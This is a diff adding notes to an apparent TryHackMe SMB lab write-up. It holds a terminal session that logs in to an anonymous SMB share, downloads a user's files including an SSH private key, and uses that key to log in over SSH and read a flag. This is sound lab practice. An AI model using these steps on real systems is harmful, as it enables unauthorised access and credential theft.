@@ -232,3 +232,377 @@ smb: \>
 
 c. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? 
 sol. 
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.10.59.204/profiles -U Anonymous -p139,445
+Password for [WORKGROUP\Anonymous]:
+Try "help" to get a list of possible commands.
+smb: \> ?
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+more           mput           newer          notify         open           
+posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
+posix_unlink   posix_whoami   print          prompt         put            
+pwd            q              queue          quit           readlink       
+rd             recurse        reget          rename         reput          
+rm             rmdir          showacls       setea          setmode        
+scopy          stat           symlink        tar            tarmode        
+timeout        translate      unlock         volume         vuid           
+wdel           logon          listconnect    showconnect    tcon           
+tdis           tid            utimes         logoff         ..             
+!              
+smb: \> ls
+  .                                   D        0  Tue Apr 21 07:08:23 2020
+  ..                                  D        0  Tue Apr 21 06:49:56 2020
+  .cache                             DH        0  Tue Apr 21 07:08:23 2020
+  .profile                            H      807  Tue Apr 21 07:08:23 2020
+  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
+  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
+  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
+  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
+  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
+  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
+  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020
+
+                12316808 blocks of size 1024. 7432700 blocks available
+smb: \> get .profile profile
+getting file \.profile of size 807 as profile (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
+smb: \> get .sudo_as_admin_successful sudoadmin
+getting file \.sudo_as_admin_successful of size 0 as sudoadmin (0.0 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+smb: \> get .viminfo viminfo
+NT_STATUS_ACCESS_DENIED opening remote file \.viminfo
+smb: \> get Working From Home Information.txt workinfo
+NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Working
+smb: \> get Working From Home Information.txt workinfo.txt
+NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Working
+smb: \> ^Z
+zsh: suspended  smbclient //10.10.59.204/profiles -U Anonymous -p139,445
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# ls
+clubweb.txt  Desktop  Documents  Downloads  Music  nessus  Pictures  profile  Public  sudoadmin  Templates  Videos
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# cat sudoadmin               
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# nano sudoadmin           
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# fg
+[1]  + continued  smbclient //10.10.59.204/profiles -U Anonymous -p139,445
+
+smb: \> ls
+  .                                   D        0  Tue Apr 21 07:08:23 2020
+  ..                                  D        0  Tue Apr 21 06:49:56 2020
+  .cache                             DH        0  Tue Apr 21 07:08:23 2020
+  .profile                            H      807  Tue Apr 21 07:08:23 2020
+  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
+  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
+  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
+  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
+  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
+  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
+  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020
+
+                12316808 blocks of size 1024. 7506728 blocks available
+smb: \> get Working From Home Information.txt work.txt
+NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Working
+smb: \> quit
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.10.59.204/profiles -U Anonymous -p139,445
+Password for [WORKGROUP\Anonymous]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Apr 21 07:08:23 2020
+  ..                                  D        0  Tue Apr 21 06:49:56 2020
+  .cache                             DH        0  Tue Apr 21 07:08:23 2020
+  .profile                            H      807  Tue Apr 21 07:08:23 2020
+  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
+  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
+  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
+  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
+  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
+  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
+  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020
+g
+                12316808 blocks of size 1024. 7412948 blocks available
+smb: \> get Working From Home Information.txt Working_from_home_information.txt
+NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Working
+smb: \> get "Working From Home Information.txt"
+getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+smb: \> get .bashrc 
+getting file \.bashrc of size 3771 as .bashrc (3.9 KiloBytes/sec) (average 2.2 KiloBytes/sec)
+smb: \> cd .gnupg\
+smb: \.gnupg\> ls
+NT_STATUS_ACCESS_DENIED listing \.gnupg\*
+smb: \.gnupg\> cd ..
+smb: \> cd .ssh\
+smb: \.ssh\> ls
+  .                                   D        0  Tue Apr 21 07:08:23 2020
+  ..                                  D        0  Tue Apr 21 07:08:23 2020
+  id_rsa                              A     1679  Tue Apr 21 07:08:23 2020
+  id_rsa.pub                          N      396  Tue Apr 21 07:08:23 2020
+  authorized_keys                     N        0  Tue Apr 21 07:08:23 2020
+
+                12316808 blocks of size 1024. 7357492 blocks available
+smb: \.ssh\> get id_rsa
+getting file \.ssh\id_rsa of size 1679 as id_rsa (1.8 KiloBytes/sec) (average 2.1 KiloBytes/sec)
+smb: \.ssh\> get id_rsa.pub 
+getting file \.ssh\id_rsa.pub of size 396 as id_rsa.pub (0.4 KiloBytes/sec) (average 1.6 KiloBytes/sec)
+smb: \.ssh\> get authorized_keys 
+NT_STATUS_ACCESS_DENIED opening remote file \.ssh\authorized_keys
+smb: \.ssh\> cd ..
+smb: \> ls
+  .                                   D        0  Tue Apr 21 07:08:23 2020
+  ..                                  D        0  Tue Apr 21 06:49:56 2020
+  .cache                             DH        0  Tue Apr 21 07:08:23 2020
+  .profile                            H      807  Tue Apr 21 07:08:23 2020
+  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
+  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
+  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
+  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
+  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
+  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
+  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020
+
+                12316808 blocks of size 1024. 7396940 blocks available
+smb: \> cd .cache\
+smb: \.cache\> ls
+NT_STATUS_ACCESS_DENIED listing \.cache\*
+smb: \.cache\> cd ..
+smb: \> ls
+  .                                   D        0  Tue Apr 21 07:08:23 2020
+  ..                                  D        0  Tue Apr 21 06:49:56 2020
+  .cache                             DH        0  Tue Apr 21 07:08:23 2020
+  .profile                            H      807  Tue Apr 21 07:08:23 2020
+  .sudo_as_admin_successful           H        0  Tue Apr 21 07:08:23 2020
+  .bash_logout                        H      220  Tue Apr 21 07:08:23 2020
+  .viminfo                            H      947  Tue Apr 21 07:08:23 2020
+  Working From Home Information.txt      N      358  Tue Apr 21 07:08:23 2020
+  .ssh                               DH        0  Tue Apr 21 07:08:23 2020
+  .bashrc                             H     3771  Tue Apr 21 07:08:23 2020
+  .gnupg                             DH        0  Tue Apr 21 07:08:23 2020
+
+                12316808 blocks of size 1024. 7584044 blocks available
+smb: \> ^Z
+zsh: suspended  smbclient //10.10.59.204/profiles -U Anonymous -p139,445
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# ls
+ clubweb.txt   Downloads    Music      profile     Templates
+ Desktop       id_rsa       nessus     Public      Videos
+ Documents     id_rsa.pub   Pictures   sudoadmin  'Working From Home Information.txt'
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# cat profile    
+# ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+
+# the default umask is set in /etc/profile; for setting the umask
+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+    # include .bashrc if it exists
+    if [ -f "$HOME/.bashrc" ]; then
+        . "$HOME/.bashrc"
+    fi
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+    PATH="$HOME/bin:$PATH"
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/.local/bin" ] ; then
+    PATH="$HOME/.local/bin:$PATH"
+fi
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# cat id_rsa    
+-----BEGIN RSA PRIVATE KEY-----
+
+-----END RSA PRIVATE KEY-----
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# ls        
+ clubweb.txt   Downloads    Music      profile     Templates
+ Desktop       id_rsa       nessus     Public      Videos
+ Documents     id_rsa.pub   Pictures   sudoadmin  'Working From Home Information.txt'
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# cat id_rsa.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# cat sudoadmin 
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# cat 'Working From Home Information.txt'
+John Cactus,
+
+As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
+possible, employees should work from home. As such- your account has now been enabled with ssh
+access to the main server.
+
+If there are any problems, please contact the IT department at it@polointernalcoms.uk
+
+Regards,
+
+James
+Department Manager 
+
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# ls -la                                                        
+total 208
+drwx------ 21 kali kali  4096 Sep 11 13:15  .
+drwxr-xr-x  3 root root  4096 Feb 25  2024  ..
+-rw-r--r--  1 kali kali   220 Feb 25  2024  .bash_logout
+-rw-r--r--  1 kali kali  3771 Sep 11 13:15  .bashrc
+-rw-r--r--  1 kali kali  3526 Feb 25  2024  .bashrc.original
+drwx------  8 kali kali  4096 May 16 05:29  .BurpSuite
+drwxr-xr-x 16 kali kali  4096 Aug 11 15:19  .cache
+-rw-r--r--  1 root root  3108 Aug 10 13:54  clubweb.txt
+drwxr-xr-x 18 kali kali  4096 Aug 11 15:08  .config
+drwx------  3 kali kali  4096 Apr 13 08:51  .dbus
+drwxr-xr-x  2 kali kali  4096 Aug 11 15:37  Desktop
+-rw-r--r--  1 kali kali    35 Apr  3 11:36  .dmrc
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Documents
+drwxr-xr-x  3 kali kali  4096 Sep  3 10:16  Downloads
+-rw-------  1 kali kali 12288 Aug 26 00:09  .exp.swp
+-rw-r--r--  1 kali kali 11759 Feb 25  2024  .face
+lrwxrwxrwx  1 kali kali     5 Feb 25  2024  .face.icon -> .face
+drwx------  3 kali kali  4096 Apr  3 11:36  .gnupg
+drwx------  2 kali kali  4096 Apr 13 08:51  .gvfs
+-rw-------  1 kali kali     0 Apr  3 11:36  .ICEauthority
+-rw-r--r--  1 root root  1679 Sep 11 13:15  id_rsa
+-rw-r--r--  1 root root   396 Sep 11 13:15  id_rsa.pub
+drwxr-xr-x  4 kali kali  4096 Apr 12 00:40  .java
+-rw-------  1 kali kali    20 Aug  7 23:06  .lesshst
+drwxr-xr-x  4 kali kali  4096 Apr  3 11:36  .local
+drwx------  4 kali kali  4096 Apr  4 13:27  .mozilla
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Music
+drwxr-xr-x  2 kali kali  4096 Apr 11 22:40  nessus
+drwxr-xr-x  2 kali kali  4096 May  6 12:48  Pictures
+drwx------  3 kali kali  4096 Apr 12 03:00  .pki
+-rw-r--r--  1 kali kali   807 Sep 10 12:38  .profile
+-rw-r--r--  1 root root   807 Sep 11 13:08  profile
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Public
+-rw-r--r--  1 root root     0 Sep 11 13:09  sudoadmin
+-rw-r--r--  1 kali kali     0 Apr  3 12:29  .sudo_as_admin_successful
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Templates
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Videos
+-rw-------  1 kali kali 12860 Sep  2 12:20  .viminfo
+-rw-r--r--  1 root root   358 Sep 11 13:14 'Working From Home Information.txt'
+-rw-------  1 kali kali    49 Sep 11 12:41  .Xauthority
+-rw-------  1 kali kali  4255 Sep 11 12:47  .xsession-errors
+-rw-------  1 kali kali  4182 Sep 11 09:47  .xsession-errors.old
+-rw-------  1 kali kali  6281 Sep 10 13:33  .zsh_history
+-rw-r--r--  1 kali kali 10868 Feb 25  2024  .zshrc
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# chmod 600 id_rsa
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# ls -la          
+total 208
+drwx------ 21 kali kali  4096 Sep 11 13:15  .
+drwxr-xr-x  3 root root  4096 Feb 25  2024  ..
+-rw-r--r--  1 kali kali   220 Feb 25  2024  .bash_logout
+-rw-r--r--  1 kali kali  3771 Sep 11 13:15  .bashrc
+-rw-r--r--  1 kali kali  3526 Feb 25  2024  .bashrc.original
+drwx------  8 kali kali  4096 May 16 05:29  .BurpSuite
+drwxr-xr-x 16 kali kali  4096 Aug 11 15:19  .cache
+-rw-r--r--  1 root root  3108 Aug 10 13:54  clubweb.txt
+drwxr-xr-x 18 kali kali  4096 Aug 11 15:08  .config
+drwx------  3 kali kali  4096 Apr 13 08:51  .dbus
+drwxr-xr-x  2 kali kali  4096 Aug 11 15:37  Desktop
+-rw-r--r--  1 kali kali    35 Apr  3 11:36  .dmrc
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Documents
+drwxr-xr-x  3 kali kali  4096 Sep  3 10:16  Downloads
+-rw-------  1 kali kali 12288 Aug 26 00:09  .exp.swp
+-rw-r--r--  1 kali kali 11759 Feb 25  2024  .face
+lrwxrwxrwx  1 kali kali     5 Feb 25  2024  .face.icon -> .face
+drwx------  3 kali kali  4096 Apr  3 11:36  .gnupg
+drwx------  2 kali kali  4096 Apr 13 08:51  .gvfs
+-rw-------  1 kali kali     0 Apr  3 11:36  .ICEauthority
+-rw-------  1 root root  1679 Sep 11 13:15  id_rsa
+-rw-r--r--  1 root root   396 Sep 11 13:15  id_rsa.pub
+drwxr-xr-x  4 kali kali  4096 Apr 12 00:40  .java
+-rw-------  1 kali kali    20 Aug  7 23:06  .lesshst
+drwxr-xr-x  4 kali kali  4096 Apr  3 11:36  .local
+drwx------  4 kali kali  4096 Apr  4 13:27  .mozilla
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Music
+drwxr-xr-x  2 kali kali  4096 Apr 11 22:40  nessus
+drwxr-xr-x  2 kali kali  4096 May  6 12:48  Pictures
+drwx------  3 kali kali  4096 Apr 12 03:00  .pki
+-rw-r--r--  1 kali kali   807 Sep 10 12:38  .profile
+-rw-r--r--  1 root root   807 Sep 11 13:08  profile
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Public
+-rw-r--r--  1 root root     0 Sep 11 13:09  sudoadmin
+-rw-r--r--  1 kali kali     0 Apr  3 12:29  .sudo_as_admin_successful
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Templates
+drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Videos
+-rw-------  1 kali kali 12860 Sep  2 12:20  .viminfo
+-rw-r--r--  1 root root   358 Sep 11 13:14 'Working From Home Information.txt'
+-rw-------  1 kali kali    49 Sep 11 12:41  .Xauthority
+-rw-------  1 kali kali  4255 Sep 11 12:47  .xsession-errors
+-rw-------  1 kali kali  4182 Sep 11 09:47  .xsession-errors.old
+-rw-------  1 kali kali  6281 Sep 10 13:33  .zsh_history
+-rw-r--r--  1 kali kali 10868 Feb 25  2024  .zshrc
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i /home/kali/id_rsa johncactus@10.10.59.204
+
+The authenticity of host '10.10.59.204 (10.10.59.204)' can't be established.
+ED25519 key fingerprint is SHA256:IiPAreH3/zvA2edHv44DY7aO0feb2/pHmNR7B1VK7+o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '10.10.59.204' (ED25519) to the list of known hosts.
+johncactus@10.10.59.204's password: 
+Permission denied, please try again.
+johncactus@10.10.59.204's password: 
+Permission denied, please try again.
+johncactus@10.10.59.204's password: 
+johncactus@10.10.59.204: Permission denied (publickey,password).
+                                                                                                                   
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i /home/kali/id_rsa cactus@10.10.59.204 
+
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Sep 11 17:34:58 UTC 2024
+
+  System load:  0.0                Processes:           92
+  Usage of /:   33.3% of 11.75GB   Users logged in:     0
+  Memory usage: 32%                IP address for eth0: 10.10.59.204
+  Swap usage:   0%
+
+
+22 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Tue Apr 21 11:19:15 2020 from 192.168.1.110
+cactus@polosmb:~$ ls
+smb.txt
+cactus@polosmb:~$ cat smb.txt
+THM{smb_is_fun_eh?}
